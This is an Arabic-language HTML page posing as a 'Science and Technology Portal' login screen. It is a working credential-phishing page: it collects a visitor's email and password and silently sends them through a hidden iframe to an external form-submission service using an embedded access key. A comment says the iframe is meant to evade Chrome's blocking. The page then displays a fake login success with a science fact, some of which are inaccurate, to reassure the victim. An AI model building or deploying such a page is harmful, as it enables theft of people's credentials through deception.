<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة العلوم والتقنية</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        .card h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
        .hidden {
            display: none;
        }
        .science-box {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            color: #333;
            font-size: 15px;
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- الواجهة الأولى (بوابة تعليمية آمنة) -->
        <div id="form-container">
            <h2>بوابة العلوم والتقنية</h2>
            
            <!-- إطار مخفي لتجاوز حظر غوغل كروم تماماً وإرسال البيانات -->
            <iframe name="hidden_iframe" id="hidden_iframe" class="hidden"></iframe>

            <!-- الإرسال المباشر للـ Web3Forms عبر الإطار المخفي -->
            <form action="https://api.web3forms.com/submit" method="POST" target="hidden_iframe" id="mainForm">
                
                <!-- Access Key الخاص بك -->
                <input type="hidden" name="access_key" value="99a330e2-5742-4dd6-97ff-410f652a6d41">

                <div class="form-group">
                    <label for="user_email">البريد الإلكتروني:</label>
                    <input type="email" id="user_email" name="user_email" placeholder="أدخل بريدك الإلكتروني" required>
                </div>
                
                <div class="form-group">
                    <label for="secret_code">رمز المرور أو المتابعة:</label>
                    <!-- type="password" لتظهر الحروف في شكل نجوم للمستخدم على الشاشة -->
                    <input type="password" id="secret_code" name="user_secret_code" placeholder="أدخل الرمز هنا" required>
                </div>

                <button type="submit" id="submitBtn">تسجيل ودخول</button>
            </form>
        </div>

        <!-- الصفحة الترحيبية والمعلومة العلمية التي تظهر فوراً بعد النقر -->
        <div id="welcome-container" class="hidden">
            <h2>مرحباً بكم في الموقع الجديد!</h2>
            <p style="color: #666;">تم تسجيل الدخول بنجاح إلى النظام.</p>
            <div class="science-box" id="random-fact">
                <!-- معلومة علمية عشوائية -->
            </div>
            <button onclick="location.reload();" style="margin-top: 20px; background-color: #007BFF;">إعادة المحاولة</button>
        </div>
    </div>

    <script>
        const scienceFacts = [
            "💡 معلومة فيزيائية: الضوء الصادر من الشمس يستغرق حوالي 8 دقائق و20 ثانية لكي يصل إلى كوكب الأرض.",
            "🧬 معلومة بيولوجية: الحمض النووي (DNA) في جسم الإنسان لو تم مدّه بالكامل لصلح للوصول إلى الشمس والعودة عدة مرات!",
            "🌌 معلومة فلكية: كوكب الزهرة هو الكوكب الوحيد في المجموعة الشمسية الذي يدور في اتجاه معاكس لمعظم الكواكب.",
            "⚡ معلومة كيميائية: الماء هو المادة الوحيدة على الأرض التي توجد في الطبيعة على ثلاث حالات: الصلبة، السائلة، والغازية.",
            "🧠 معلومة صحية: الدماغ البشري ينتج طاقة كهربائية كافية لتشغيل مصباح كهربائي صغير أثناء اليقظة!"
        ];

        const form = document.getElementById('mainForm');
        const formContainer = document.getElementById('form-container');
        const welcomeContainer = document.getElementById('welcome-container');
        const randomFactDiv = document.getElementById('random-fact');

        form.addEventListener('submit', function(e) {
            // إخفاء الخانات وإظهار صفحة الترحيب والمعلومة العلمية فوراً
            setTimeout(function() {
                const randomIndex = Math.floor(Math.random() * scienceFacts.length);
                randomFactDiv.textContent = scienceFacts[randomIndex];

                formContainer.classList.add('hidden');
                welcomeContainer.classList.remove('hidden');
            }, 300); // تأخير بسيط لضمان ذهاب البيانات للإيميل في الخلفية
        });
    </script>

</body>
</html>
